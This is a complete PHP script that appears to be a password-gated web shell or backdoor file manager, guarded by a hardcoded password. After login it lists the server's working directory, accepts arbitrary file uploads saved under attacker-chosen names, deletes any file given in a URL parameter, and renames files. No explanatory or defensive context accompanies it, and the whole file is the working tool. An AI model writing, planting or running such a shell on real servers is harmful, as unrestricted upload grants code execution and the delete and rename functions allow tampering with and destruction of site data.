<?php
if(isset($_POST['pass'])&&$_POST['pass']=='natan'){setcookie('auth',md5('natan'),time()+3600,'/');}
if(!isset($_COOKIE['auth'])||$_COOKIE['auth']!=md5('natan')){die('<form method=post><input type=password name=pass><input type=submit></form>');}

echo "<b>PWD:</b> ".getcwd()."<br><br>";

echo "<b>FILES:</b><br>";
$files = scandir(getcwd());
foreach($files as $f){if($f!='.'&&$f!='..'){echo $f." (".filesize($f)." bytes)<br>";}}
echo "<br>";

if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]);echo"Uploaded: ".$_FILES["f"]["name"]."<br><br>";}

echo '<form method=post enctype=multipart/form-data><input type=file name=f><input type=submit value=Upload></form>';

if(isset($_GET['del'])){unlink($_GET['del']);echo"Deleted: ".$_GET['del']."<br>";}
if(isset($_POST['rename_old'])&&isset($_POST['rename_new'])){rename($_POST['rename_old'],$_POST['rename_new']);echo"Renamed<br>";}

echo '<hr>';
echo '<form method=get><input type=text name=del placeholder="file to delete"><input type=submit value=Delete></form>';
echo '<form method=post><input type=text name=rename_old placeholder="old name"><input type=text name=rename_new placeholder="new name"><input type=submit value=Rename></form>';
?>